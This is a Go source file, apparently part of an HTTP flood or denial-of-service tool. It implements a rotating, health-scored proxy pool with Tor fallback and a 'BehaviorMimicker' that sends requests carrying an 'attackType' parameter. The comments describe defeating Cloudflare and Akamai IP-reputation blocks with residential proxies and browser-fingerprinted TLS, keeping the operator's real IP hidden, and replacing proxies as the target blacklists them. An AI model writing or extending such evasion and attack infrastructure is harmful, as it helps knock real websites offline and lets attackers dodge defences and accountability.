package main

import (
	"bufio"
	"context"
	"fmt"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// proxyHealth is the per proxy track record the pool keeps so it can both evict
// dead proxies and bias selection toward the ones actually carrying traffic.
type proxyHealth struct {
	successes uint64
	failures  uint64
	strikes   int // consecutive failures; reset by any success
}

type ProxyPool struct {
	proxies []string
	index   uint64
	mu      sync.RWMutex
	scraper *ProxyScraper

	// health is the per proxy track record keyed by proxy URL. consecutive
	// transport-level failures (strikes) retire a dead proxy; the running
	// success/failure totals also feed GetNext's health-aware selection so workers
	// drift toward proxies that work instead of round-robining blindly across a list
	// that's half dead. a success clears the strike count, so transient blips don't
	// accumulate toward eviction.
	health       map[string]*proxyHealth
	evictedCount uint64

	// verified is the subset of proxies that actually PASSED validation, the only
	// thing ever written to proxy_cache.json. it's kept distinct from `proxies`
	// because, on a total validation miss, `proxies` falls back to the raw scraped
	// list so the run isn't dead in the water; caching that raw list (as the old code
	// did) poisoned the "known-good" cache with thousands of untested entries and made
	// the next startup re-validate junk. the cache must only contain proven-good ones.
	verified []string
}

// proxyEvictionThreshold is how many consecutive failures retire a proxy.
const proxyEvictionThreshold = 3

// proxySelectionSamples is how many random candidates GetNext scores per call
// before returning the best, "best of K" weighted selection. higher = stronger
// bias toward healthy proxies but less spread; 4 is a good balance.
const proxySelectionSamples = 4

func NewProxyPool() *ProxyPool {
	return &ProxyPool{
		scraper: NewProxyScraper(),
		health:  make(map[string]*proxyHealth),
	}
}

// Report feeds the outcome of using `proxy` back into the pool's health tracking.
// transport/dial failures count as strikes; proxyEvictionThreshold consecutive
// strikes evict the proxy and return true so the caller can rebuild onto a fresh
// one. a success clears the strike count and credits the proxy's success total.
// the pool never evicts its last proxy, dropping to zero would silently fall back
// to the operator's real IP, which is worse than reusing a flaky proxy. an empty
// proxy string (direct connection) is a no-op.
func (p *ProxyPool) Report(proxy string, ok bool) bool {
	if proxy == "" {
		return false
	}
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.health == nil {
		p.health = make(map[string]*proxyHealth)
	}
	h := p.health[proxy]
	if h == nil {
		h = &proxyHealth{}
		p.health[proxy] = h
	}
	if ok {
		h.successes++
		h.strikes = 0
		return false
	}
	h.failures++
	h.strikes++
	if h.strikes < proxyEvictionThreshold || len(p.proxies) <= 1 {
		return false
	}
	for i, px := range p.proxies {
		if px == proxy {
			p.proxies = append(p.proxies[:i], p.proxies[i+1:]...)
			delete(p.health, proxy)
			atomic.AddUint64(&p.evictedCount, 1)
			return true
		}
	}
	return false
}

// EvictedCount returns how many dead proxies were retired during the run.
func (p *ProxyPool) EvictedCount() uint64 {
	return atomic.LoadUint64(&p.evictedCount)
}

// scoreLocked returns a proxy's Laplace-smoothed success rate in [0,1]. the caller
// must hold at least the read lock. unproven proxies (no recorded outcomes) score
// 0.5, an optimistic prior so fresh proxies still get tried instead of being
// starved by a couple of early winners. the +1/+2 smoothing also keeps a single
// unlucky failure from zeroing a proxy out permanently.
func (p *ProxyPool) scoreLocked(proxy string) float64 {
	h := p.health[proxy]
	if h == nil {
		return 0.5
	}
	total := h.successes + h.failures
	if total == 0 {
		return 0.5
	}
	return float64(h.successes+1) / float64(total+2)
}

func (p *ProxyPool) GetNext() string {
	// the length check, sampling, and health reads all happen under the same RLock.
	// Report() reassigns p.proxies and mutates p.health under a write lock, so any
	// read here (len, slice index, p.health) must be lock-guarded, the race
	// detector flags it the moment evictions and GetNext overlap.
	p.mu.RLock()
	n := len(p.proxies)
	if n == 0 {
		p.mu.RUnlock()
		// Use built-in public proxies if no custom ones provided
		return p.getBuiltInProxy()
	}
	// health-aware "best of K": sample a few proxies via the round-robin index
	// (so we still spread across the list) and return the healthiest of the sample.
	// on rotation (429 / eviction) this steers workers onto proxies that are
	// actually succeeding rather than the next dead IP in line.
	bestProxy := ""
	bestScore := -1.0
	for i := 0; i < proxySelectionSamples; i++ {
		idx := atomic.AddUint64(&p.index, 1) % uint64(n)
		cand := p.proxies[idx]
		if score := p.scoreLocked(cand); score > bestScore {
			bestScore = score
			bestProxy = cand
		}
	}
	p.mu.RUnlock()
	return bestProxy
}

func (p *ProxyPool) getBuiltInProxy() string {
	// the old version of this function cycled through dead placeholder proxies
	// ("proxy.server.com:8080" etc.) which do not exist. every request routed
	// through them failed silently at the TCP dial stage, worse than going
	// direct, because we lost the request AND got no useful error.
	//
	// now we only return a proxy here if Tor is actually running on the local
	// machine. if it is, socks5 over Tor gives us a real exit node for free.
	// if it is not, we return an empty string and the worker dials direct.
	// going direct is honest: the operator knows they need real proxies and can
	// pass -proxies or -rotate-proxy instead of silently burning requests.
	torAddr := "127.0.0.1:9050"
	conn, err := net.DialTimeout("tcp", torAddr, 1*time.Second)
	if err == nil {
		conn.Close()
		return "socks5://" + torAddr
	}
	return ""
}

// LoadProxies reads a proxy list file and populates the pool.
//
// one proxy per line. blank lines and lines starting with # are ignored.
// supported formats:
//
//	socks5://user:pass@host:port   residential/paid SOCKS5, best evasion
//	socks5://host:port             unauthenticated SOCKS5
//	http://user:pass@host:port     authenticated HTTP CONNECT proxy
//	http://host:port               plain HTTP proxy
//	host:port                      treated as http://host:port
//
// residential SOCKS5 proxies (brightdata, oxylabs, smartproxy, webshare, etc.)
// are the only proxy type that defeats CDN IP-reputation blocks. free scraped
// proxies from -rotate-proxy are datacenter IPs that cloudflare and akamai
// pre-flag. if you have a paid residential proxy plan, export it in the format
// above and pass it via -proxies. the tool is fully wired to use them, the
// dialViaSOCKS5 path in tls_fingerprint.go handles authenticated SOCKS5
// end-to-end, so the uTLS browser handshake rides over the tunnel.
func (p *ProxyPool) LoadProxies(filename string) error {
	f, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("open proxy file: %w", err)
	}
	defer f.Close()

	var loaded []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// bare host:port -> normalise to http://
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		if _, err := url.Parse(line); err != nil {
			continue // skip unparseable entries
		}
		loaded = append(loaded, line)
	}
	if err := scanner.Err(); err != nil {
		return fmt.Errorf("read proxy file: %w", err)
	}
	if len(loaded) == 0 {
		return fmt.Errorf("no valid proxy entries found in %s", filename)
	}

	p.mu.Lock()
	p.proxies = loaded
	p.mu.Unlock()

	fmt.Printf("[ok] loaded %d proxies from %s\n", len(loaded), filename)
	return nil
}

// ScrapeAndLoadProxies loads proxies for targetURL using a cache-first strategy.
//
// the logic is: re-test whatever we already have on disk before spending time scraping.
// known-good proxies from a previous run are likely still alive, so we validate them
// against the target first. if enough pass we skip acquisition entirely. scraping only
// happens when the cache is empty or too few cached proxies survive re-validation.
//
// this means a second run (or a run shortly after another) starts in a few seconds
// instead of the full 60-90s scrape+validate cycle.
func (p *ProxyPool) ScrapeAndLoadProxies(targetURL string) error {
	// look back up to 2 hours, we'll re-test them anyway, so age is just a
	// coarse filter to avoid testing proxies that have almost certainly rotated
	cached := loadProxyCache(2 * time.Hour)

	if len(cached) > 0 {
		fmt.Printf("found %d cached proxies — re-validating against target before scraping\n", len(cached))
		// cap re-validation at 1000, we only need a healthy pool, not proof that
		// every cached proxy is still alive. GetWorkingProxies stops even earlier
		// internally once targetGoodProxies are found.
		maxRevalidate := len(cached)
		if maxRevalidate > 1000 {
			maxRevalidate = 1000
		}
		stillWorking := p.scraper.GetWorkingProxies(cached, maxRevalidate, targetURL)

		if len(stillWorking) >= 10 {
			// cache is healthy, no need to scrape
			fmt.Printf("[ok] %d/%d cached proxies still alive — skipping acquisition\n", len(stillWorking), len(cached))
			p.mu.Lock()
			p.proxies = stillWorking
			p.verified = stillWorking // these just passed re-validation -> known-good
			p.mu.Unlock()
			// refresh the cache timestamp so the next run sees them as recent
			saveProxyCache(stillWorking)
			return nil
		}

		fmt.Printf("only %d/%d cached proxies survived — falling through to full scrape\n", len(stillWorking), len(cached))
		// carry the survivors into the merge below so they aren't thrown away
		cached = stillWorking
	} else {
		fmt.Printf("no cached proxies found — starting full acquisition\n")
		cached = nil
	}

	allProxies := p.scraper.ScrapeProxies()
	if len(allProxies) == 0 && len(cached) == 0 {
		return fmt.Errorf("no proxies found from any source")
	}

	// merge surviving cached entries with freshly scraped so we don't discard
	// anything that already passed validation
	allProxies = removeDuplicates(append(allProxies, cached...))

	// cap the goroutine count, not the time, GetWorkingProxies stops early once it
	// has targetGoodProxies OR the acquisition time budget elapses, so a generous
	// cap just gives a low-hit-rate free-proxy pool enough candidates to actually
	// find some, without risking a long run (the budget bounds that).
	workingProxies := p.scraper.GetWorkingProxies(allProxies, 2000, targetURL)

	// `validated` is the only thing we'll persist. on a total validation miss we still
	// hand the workers the raw scraped list so the run isn't dead, but we must NOT
	// cache it, or the next startup re-validates thousands of untested entries.
	validated := workingProxies
	if len(workingProxies) == 0 {
		fmt.Printf("[!] no proxies passed all three validation gates — using the raw scraped list for THIS run only (cache left untouched)\n")
		workingProxies = allProxies
	}

	p.mu.Lock()
	p.proxies = workingProxies
	p.verified = validated
	p.mu.Unlock()

	// persist ONLY validated proxies; if none validated, leave the existing cache as-is
	// rather than overwriting good history with this run's unverified fallback.
	if len(validated) > 0 {
		saveProxyCache(validated)
		fmt.Printf("[ok] %d validated proxies loaded and cached\n", len(validated))
	} else {
		fmt.Printf("[!] %d unverified proxies loaded for this run; cache left unchanged\n", len(workingProxies))
	}
	for i, proxy := range workingProxies {
		if i >= 5 {
			fmt.Printf("   ... and %d more\n", len(workingProxies)-5)
			break
		}
		fmt.Printf("   - %s\n", proxy)
	}
	return nil
}

// GetProxyCount returns the number of loaded proxies
func (p *ProxyPool) GetProxyCount() int {
	p.mu.RLock()
	defer p.mu.RUnlock()
	return len(p.proxies)
}

// StartBackgroundRefresh runs a goroutine that scrapes and validates fresh proxies on
// a fixed interval and merges them into the live pool. this keeps the pool from draining
// during long runs as proxies die and get blacklisted by the target's CDN/firewall.
func (p *ProxyPool) StartBackgroundRefresh(ctx context.Context, targetURL string, interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				allProxies := p.scraper.ScrapeProxies()
				fresh := p.scraper.GetWorkingProxies(allProxies, 50, targetURL)
				if len(fresh) == 0 {
					continue
				}
				p.mu.Lock()
				seen := make(map[string]bool, len(p.proxies))
				for _, px := range p.proxies {
					seen[px] = true
				}
				verifiedSeen := make(map[string]bool, len(p.verified))
				for _, px := range p.verified {
					verifiedSeen[px] = true
				}
				added := 0
				verifiedGrew := false
				for _, px := range fresh {
					if !seen[px] {
						p.proxies = append(p.proxies, px)
						seen[px] = true
						added++
					}
					// `fresh` already passed validation, so it's all cache-worthy,
					// including any that were already in the pool as raw fallback but
					// have now proven good.
					if !verifiedSeen[px] {
						p.verified = append(p.verified, px)
						verifiedSeen[px] = true
						verifiedGrew = true
					}
				}
				total := len(p.proxies)
				// snapshot under the lock; do the file write outside it
				verifiedSnapshot := append([]string(nil), p.verified...)
				p.mu.Unlock()
				if added > 0 {
					fmt.Printf("proxy pool refreshed: +%d new proxies (%d total)\n", added, total)
				}
				if verifiedGrew {
					saveProxyCache(verifiedSnapshot) // only ever cache validated proxies
				}
			}
		}
	}()
}

// BehaviorMimicker simulates realistic user behavior
type BehaviorMimicker struct {
	sessionDuration time.Duration
	thinkTime       time.Duration
	pageViews       int
	bounceRate      float64
}

func (b *BehaviorMimicker) SimulateUserSession(ctx context.Context, target string, client *http.Client, attackType uint8) {
	session := &http.Client{
		Transport: client.Transport,
		Timeout:   client.Timeout,
		Jar:       nil,
	}

	for i := 0; i < b.pageViews; i++ {
		// use a timer-select instead of time.Sleep so ctx cancellation
		// interrupts the think-time pause immediately on shutdown
		think := time.Duration(mathrand.Intn(int(b.thinkTime)))
		select {
		case <-ctx.Done():
			return
		case <-time.After(think):
		}

		advancedHTTPCall(ctx, target, session, attackType)

		if ctx.Err() != nil {
			return
		}

		if mathrand.Float64() < b.bounceRate {
			break
		}
	}
}
